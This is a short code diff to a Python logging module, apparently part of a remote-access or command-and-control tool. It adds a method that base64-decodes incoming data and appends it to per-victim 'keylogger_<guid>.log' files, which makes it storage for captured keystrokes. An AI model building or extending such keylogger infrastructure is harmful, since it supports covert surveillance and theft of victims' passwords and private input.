@@ -3,6 +3,7 @@
     @package: core/log.py
 """
 import time
+import base64
 from core.utils import Utils
 
 class Log:
@@ -44,3 +45,8 @@ class Log:
     @staticmethod
     def get_current_date():
         return time.strftime("%d-%m-%Y")    
+
+    @staticmethod
+    def append_keylogger_data(guid, data):
+	path = "%skeylogger_%s.log" % (Log.create_folder_tree(), guid)
+	open(path, "a+").write(base64.b64decode(data))
